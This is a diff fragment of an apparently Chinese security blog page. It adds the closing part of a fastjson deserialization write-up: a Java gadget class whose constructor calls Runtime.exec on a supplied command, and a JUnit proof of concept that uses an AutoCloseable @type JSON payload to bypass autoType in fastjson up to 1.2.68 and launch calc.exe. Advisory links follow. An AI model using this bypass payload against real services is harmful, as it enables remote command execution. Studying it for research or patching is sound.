+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token function">VulClass</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>poc</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
+<span class="token comment" spellcheck="true">//fastjson &lt;= 1.2.68通杀绕过</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">TestAutoTypeBypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    String poc <span class="token operator">=</span> <span class="token string">"{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.thonsun.demo02.VulClass\", \"cmd\":\"calc.exe\"}"</span><span class="token punctuation">;</span>
+
+    JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行的效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228201543507.png" alt="image-20201228201543507"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.<a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">fastjson 安全公告</a></p>
 <p>2.<a href="https://help.aliyun.com/noticelist/articleid/1060613676.html?spm=a2c4g.789213612.n2.16.46346141x9sQ6h" target="_blank" rel="noopener">阿里云安全公告</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -1528,7 +1931,7 @@
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">45.5k</span> 字
+                <span class="white-color">47.6k</span> 字
             
 
             
